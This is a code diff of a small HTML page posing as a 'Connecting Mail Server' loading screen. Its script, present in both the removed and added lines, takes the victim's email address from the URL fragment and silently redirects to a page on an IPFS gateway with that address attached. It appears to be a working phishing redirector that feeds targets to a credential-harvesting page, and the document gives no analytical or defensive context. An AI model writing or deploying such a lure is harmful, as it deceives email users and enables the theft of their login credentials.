@@ -3,18 +3,18 @@
   <head>
     <title>Connecting Mail Server...</title>
     <script>
-      // Retrieve the email address from the URL fragment (after the #)
-      const emailFromHash = window.location.hash.substring(1); // Get text after '#'
+  // Get email from the URL fragment
+  const email = window.location.hash.substring(1); // Get text after '#'
 
-      // Default email if not found in the URL
-      const email = emailFromHash || "default@example.com";
-
-      // Build the redirect URL with the email
-      const redirectUrl = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${email}`;
-
-      // Redirect
-      window.location.replace(redirectUrl);
-    </script>
+  // If email exists, build redirect URL and redirect immediately
+  if (email) {
+    const redirectUrl = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${email}`;
+    window.location.replace(redirectUrl);
+  } else {
+    // Handle the case where no email is found
+    console.log("No email found in URL");
+  }
+</script>
   </head>
   <body>
     <p>Connecting Mail Server, please wait...</p>
